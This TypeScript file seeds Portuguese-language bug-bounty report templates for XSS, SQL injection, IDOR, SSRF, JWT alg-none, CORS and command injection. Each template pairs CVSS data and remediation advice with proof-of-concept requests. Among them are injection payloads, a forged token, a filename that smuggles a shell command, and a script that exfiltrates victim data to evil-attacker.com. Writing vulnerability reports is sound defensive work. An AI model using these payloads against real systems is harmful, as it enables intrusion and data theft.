import { ReportTemplate } from '../types';

export const INITIAL_REPORT_TEMPLATES: ReportTemplate[] = [
  {
    id: 'tpl-xss-reflected',
    name: 'Cross-Site Scripting (XSS Refletido)',
    description: 'Esqueleto padrão para XSS refletido em parâmetros GET/POST com injeção de payload e bypass de sanitização',
    category: 'Web / OWASP',
    vulnerabilityType: 'Reflected XSS',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation (\'Cross-site Scripting\')',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    cvssScore: 6.1,
    severity: 'MEDIUM',
    titlePattern: '[XSS Refletido] Execução de JavaScript arbitrário no parâmetro {param} em {endpoint}',
    summary: 'A aplicação web reflete entradas fornecidas pelo usuário sem validação ou escape contextual de caracteres HTML/JS, permitindo a injeção e execução de scripts arbitrários no contexto de segurança da origem da vítima.',
    stepsToReproduce: [
      'Acesse o navegador ou intercepte a requisição via Burp Suite.',
      'Navegue até a URL do endpoint vulnerável: https://{target}/{endpoint}?{param}=teste',
      'Submeta no parâmetro vulnerável o seguinte payload de teste: <script>alert(document.domain)</script> ou <img src=x onerror=alert(origin)>',
      'Observe a renderização direta no DOM e a execução imediata do diálogo com o domínio da aplicação.'
    ],
    proofOfConcept: `GET /{endpoint}?{param}=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {target}
User-Agent: Mozilla/5.0 (Security-Researcher/BugSentinel)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="search-result">
  Resultados para: <script>alert(document.domain)</script>
</div>`,
    businessImpact: 'Um invasor pode induzir usuários legítimos a clicarem em links especialmente preparados (via Phishing, canais corporativos ou mídias sociais), resultando no sequestro de cookies de sessão (document.cookie), realização de transações em nome da vítima e defacement visual.',
    remediation: 'Implemente codificação contextual (context-aware output encoding) em todas as saídas refletidas utilizando bibliotecas consolidadas (ex: DOMPurify ou frameworks com auto-escaping como React/Vue). Reforce a proteção adotando uma Content Security Policy (CSP) restritiva com nonce ou hash.',
    tags: ['#xss', '#reflected-xss', '#owasp-top10', '#client-side'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-sqli-union-error',
    name: 'Injeção de SQL (SQLi / Union & Error Based)',
    description: 'Template para SQL Injection clássica permitindo extração de registros sensíveis e tabelas do banco de dados',
    category: 'Web / OWASP',
    vulnerabilityType: 'SQL Injection',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command (\'SQL Injection\')',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cvssScore: 9.8,
    severity: 'CRITICAL',
    titlePattern: '[SQLi] Injeção SQL na consulta de {recurso} permitindo extração não autorizada do banco de dados',
    summary: 'Parâmetros enviados pelo cliente são interpolados diretamente em consultas SQL dinâmicas sem sanitização ou uso de Prepared Statements parametrizados, permitindo subverter a lógica das consultas e extrair dados sigilosos.',
    stepsToReproduce: [
      'Identifique o endpoint de busca ou filtragem de registros.',
      'Envie o caractere delimitador (\' ou ") para forçar quebra sintática e observar a mensagem de erro do SGBD.',
      'Injete uma cláusula booleana ou temporal para confirmar a injeção: \' OR 1=1-- ou \' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--',
      'Execute uma cláusula UNION SELECT para mapear colunas e extrair metadados (ex: @@version ou schema_name).'
    ],
    proofOfConcept: `POST /api/v1/{endpoint} HTTP/1.1
Host: {target}
Content-Type: application/json
User-Agent: BugSentinel-Researcher

{
  "search_filter": "item' UNION SELECT NULL, table_name, column_name FROM information_schema.columns WHERE table_schema=database()--"
}

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "data": [
    {"id": null, "name": "users", "description": "password_hash"}
  ]
}`,
    businessImpact: 'Comprometimento total da confidencialidade e integridade dos dados armazenados na infraestrutura. Atacantes remotos não autenticados podem extrair senhas com hash, dados PII de clientes (LGPD/GDPR), chaves de API internas ou modificar registros financeiros.',
    remediation: 'Substitua todas as consultas SQL dinâmicas concatenadas por instruções parametrizadas (Prepared Statements / Parameterized Queries) ou consultas gerenciadas pelo ORM com bind seguro de variáveis. Nunca passe entradas diretas para o driver de banco.',
    tags: ['#sqli', '#critical', '#database', '#owasp-a03', '#injection'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-idor-bola',
    name: 'IDOR / BOLA (Broken Object Level Authorization)',
    description: 'Esqueleto para falhas de autorização de objetos em APIs REST/GraphQL (acesso a registros de outros usuários)',
    category: 'API Security',
    vulnerabilityType: 'IDOR / BOLA',
    cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N',
    cvssScore: 7.1,
    severity: 'HIGH',
    titlePattern: '[IDOR] Leitura e modificação não autorizada de {recurso} de terceiros via manipulação de ID em {endpoint}',
    summary: 'A API aceita identificadores de recursos diretamente fornecidos na URL ou corpo da requisição sem verificar se o usuário autenticado na sessão corrente possui autorização legítima de propriedade sobre o recurso solicitado.',
    stepsToReproduce: [
      'Crie duas contas de usuário com permissões idênticas: Usuário A (Atacante) e Usuário B (Vítima).',
      'Faça login com o Usuário A e capture a requisição legítima para consultar seus próprios dados em /api/v2/{endpoint}/{id_usuario_a}.',
      'Identifique o identificador correspondente do Usuário B ({id_usuario_b}).',
      'Envie a mesma requisição mantendo as credenciais/token do Usuário A, alterando o ID no caminho para {id_usuario_b}.',
      'Verifique que a API retorna código 200 OK contendo os dados privados do Usuário B.'
    ],
    proofOfConcept: `GET /api/v2/{endpoint}/10984 HTTP/1.1
Host: {target}
Authorization: Bearer [TOKEN_USUARIO_A]
Accept: application/json

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: application/json

{
  "user_id": 10984,
  "owner_name": "Usuario Vitima B",
  "email": "vitima@empresa.com",
  "cpf": "123.456.789-00",
  "balance_cents": 450000
}`,
    businessImpact: 'Violação severa de isolamento multilocatário (multitenancy). Qualquer usuário cadastrado pode enumerar de forma automatizada e exfiltrar cadastros confidenciais, documentos e faturas de todos os clientes da plataforma.',
    remediation: 'Implemente verificações rigorosas de controle de acesso baseadas em atributos (ABAC/RBAC) no nível do repositório/serviço. Valide se req.user.id coincide com o proprietário do registro antes de retornar o objeto do banco de dados.',
    tags: ['#idor', '#bola', '#api-security', '#owasp-api1', '#broken-access-control'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-ssrf-cloud',
    name: 'SSRF (Server-Side Request Forgery em Cloud Metadata)',
    description: 'Template para SSRF com tentativa de acesso ao endpoint de metadados da nuvem AWS/GCP (169.254.169.254)',
    category: 'Cloud & Infra',
    vulnerabilityType: 'Server-Side Request Forgery (SSRF)',
    cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
    cvssScore: 8.6,
    severity: 'HIGH',
    titlePattern: '[SSRF] Requisições forjadas a partir do backend permitindo leitura do Cloud Metadata (169.254.169.254)',
    summary: 'A aplicação web processa URLs externas fornecidas pelo usuário para download de arquivos, previews ou webhooks sem validar o endereço de destino, permitindo direcionar conexões para a rede local interna e serviços de metadados de nuvem.',
    stepsToReproduce: [
      'Localize a funcionalidade de upload por URL, renderização de webhook ou geração de PDF.',
      'Insira a URL de metadados de nuvem: http://169.254.169.254/latest/meta-data/ (AWS) ou http://metadata.google.internal/computeMetadata/v1/ (GCP).',
      'Dispare o processamento e examine o arquivo retornado ou resposta da aplicação.',
      'Confirme o acesso às chaves e credenciais de segurança temporárias do servidor.'
    ],
    proofOfConcept: `POST /api/v1/utilities/fetch-avatar HTTP/1.1
Host: {target}
Content-Type: application/json
Authorization: Bearer [TOKEN_PESQUISADOR]

{
  "image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"
}

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: application/json

{
  "Code": "Success",
  "AccessKeyId": "[REDACTED_AWS_TEMPORARY_ACCESS_KEY_ID]",
  "SecretAccessKey": "[REDACTED_AWS_SECRET_ACCESS_KEY]",
  "Token": "[REDACTED_AWS_SESSION_SECURITY_TOKEN]",
  "Expiration": "2026-09-15T22:00:00Z"
}`,
    businessImpact: 'Exfiltração de credenciais temporárias do IAM da infraestrutura de nuvem, possibilitando assunção de papéis privilegiados no provedor cloud, movimentação lateral e acesso irrestrito a buckets S3 e bancos internos.',
    remediation: 'Implemente validação estrita de lista de permissões (allowlist) de domínios externos. Bloqueie resoluções de DNS para faixas privadas (RFC 1918) e o endereço link-local 169.254.169.254. Na AWS, exija o IMDSv2 com hop-limit restrito a 1.',
    tags: ['#ssrf', '#cloud', '#aws', '#metadata', '#owasp-a10'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-jwt-none-alg',
    name: 'Quebra de Autenticação / JWT (Algoritmo None)',
    description: 'Esqueleto para falhas em assinaturas JWT onde o backend aceita o algoritmo "none" sem chave',
    category: 'Auth & Session',
    vulnerabilityType: 'Broken Authentication',
    cwe: 'CWE-287: Improper Authentication',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    cvssScore: 9.1,
    severity: 'CRITICAL',
    titlePattern: '[Auth Bypass] Aceitação de algoritmo "none" no JWT permitindo forjar tokens com privilégios de Admin',
    summary: 'O verificador de tokens JWT da API não restringe os algoritmos de assinatura permitidos e aceita tokens com cabeçalho "alg": "none", dispensando a validação de assinatura criptográfica e permitindo a geração de tokens válidos arbitrariamente.',
    stepsToReproduce: [
      'Capture um JWT válido emitido pelo fluxo de login normal.',
      'Decodifique o cabeçalho base64 e substitua {"alg": "RS256"} por {"alg": "none"}.',
      'No payload, altere a permissão para {"role": "admin", "is_superuser": true}.',
      'Remova a parte da assinatura final (deixando apenas header.payload.).',
      'Envie a requisição autenticada ao painel de administração e confirme o acesso concedido.'
    ],
    proofOfConcept: `GET /api/v1/admin/users HTTP/1.1
Host: {target}
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAyIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzk5OTk5OTk5fQ.

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: application/json

{
  "role": "admin",
  "users_count": 52140,
  "system_status": "SUPERUSER_AUTHENTICATED"
}`,
    businessImpact: 'Bypass completo dos mecanismos de autenticação e autorização da aplicação. Qualquer usuário ou atacante anônimo pode forjar tokens de qualquer funcionário ou administrador do sistema.',
    remediation: 'Configure a biblioteca JWT para aceitar explicitamente apenas algoritmos seguros (ex: RS256 ou EdDSA). Rejeite explicitamente o algoritmo \'none\' e certifique-se de que a biblioteca não use a chave pública como segredo HMAC em caso de confusão de algoritmo.',
    tags: ['#jwt', '#authentication', '#critical', '#account-takeover', '#owasp-a07'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-cors-misconfig',
    name: 'Configuração Incorreta de CORS (Origin Arbitrária com Credenciais)',
    description: 'Template para CORS excessivamente permissivo com reflexão de cabeçalho Origin e credenciais habilitadas',
    category: 'Web / OWASP',
    vulnerabilityType: 'CORS Misconfiguration',
    cwe: 'CWE-942: Permissive Cross-domain Policy with Untrusted Domains',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N',
    cvssScore: 6.5,
    severity: 'MEDIUM',
    titlePattern: '[CORS] Reflexão arbitrária de cabeçalho Origin com Access-Control-Allow-Credentials: true em {endpoint}',
    summary: 'O servidor reflete cegamente qualquer cabeçalho Origin recebido na requisição e ativa Access-Control-Allow-Credentials: true, permitindo que páginas de terceiros na internet leiam dados privados de usuários autenticados via navegador.',
    stepsToReproduce: [
      'Envie uma requisição HTTP para o endpoint contendo dados pessoais adicionando o cabeçalho: Origin: https://evil-attacker.com.',
      'Analise a resposta HTTP e confirme os cabeçalhos: Access-Control-Allow-Origin: https://evil-attacker.com e Access-Control-Allow-Credentials: true.',
      'Crie um script PoC HTML contendo uma chamada fetch({endpoint}, {credentials: "include"}).',
      'Abra a página PoC em um navegador logado e veja os dados da resposta sendo capturados e exfiltrados.'
    ],
    proofOfConcept: `GET /api/v1/user/private-profile HTTP/1.1
Host: {target}
Origin: https://evil-attacker.com
Cookie: session_id=s%3Aj28dj29d...

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
Vary: Origin

{
  "email": "usuario@empresa.com",
  "credit_cards": [{"last4": "4242", "token": "tok_xyz"}]
}

--- Exploit PoC em JavaScript ---
<script>
  fetch("https://{target}/api/v1/user/private-profile", { credentials: "include" })
    .then(r => r.json())
    .then(data => fetch("https://evil-attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(data))));
</script>`,
    businessImpact: 'Quebra do princípio de isolamento de mesma origem (Same-Origin Policy). Qualquer visitante do site malicioso que tenha uma sessão ativa na plataforma terá seus dados pessoais e financeiros extraídos sem consentimento.',
    remediation: 'Remova o espelhamento dinâmico do cabeçalho Origin. Mantenha uma lista estrita de domínios corporativos permitidos e, se a autenticação depender de cookies/credenciais, utilize regras explícitas em vez de curingas ou reflexão descontrolada.',
    tags: ['#cors', '#web', '#browser-security', '#owasp-top10'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  },
  {
    id: 'tpl-rce-cmd-injection',
    name: 'Execução Remota de Código / Injeção de Comando (RCE)',
    description: 'Esqueleto para Command Injection em rotinas de geração de relatórios, processamento de imagem ou utilitários',
    category: 'Cloud & Infra',
    vulnerabilityType: 'Remote Code Execution (RCE)',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command (\'OS Command Injection\')',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    cvssScore: 10.0,
    severity: 'CRITICAL',
    titlePattern: '[RCE] Injeção de comandos de shell no processamento de {recurso} em {endpoint}',
    summary: 'A aplicação repassa entradas do usuário diretamente para shells do sistema operacional (como bash/sh via child_process.exec ou system()) sem escapar caracteres de controle, permitindo a execução de comandos com os privilégios do servidor web.',
    stepsToReproduce: [
      'Identifique o endpoint que executa rotinas utilitárias do SO (ex: conversão de arquivos, testes de ping ou compressão).',
      'Injete operadores de encadeamento de comandos de shell: ; id ou $(id) ou `id` ou | id.',
      'Envie a requisição e observe a saída do comando inserido retornada no corpo da resposta ou através de teste Out-of-Band (OOB).'
    ],
    proofOfConcept: `POST /api/v1/tools/convert-doc HTTP/1.1
Host: {target}
Content-Type: application/x-www-form-urlencoded

filename=documento.pdf%3B+id+%23

--- Resposta do Servidor ---
HTTP/1.1 200 OK
Content-Type: text/plain

uid=1001(www-data) gid=1001(www-data) groups=1001(www-data)
Linux ip-10-0-1-45 5.15.0-generic #88-Ubuntu SMP`,
    businessImpact: 'Tomada total de controle sobre a máquina servidora. O atacante adquire shell interativo, podendo pivotar para a rede interna, instalar mineradores de criptoativos, corromper bancos de dados ou persistir acessos.',
    remediation: 'Evite invocar interpretadores de comandos de shell do sistema. Utilize bibliotecas nativas de linguagem em vez de utilitários externos. Se for indispensável invocar binários, utilize APIs que aceitam arrays de argumentos sem execução de shell (ex: execFile).',
    tags: ['#rce', '#command-injection', '#critical', '#infrastructure'],
    isBuiltIn: true,
    createdAt: '2026-01-10'
  }
];
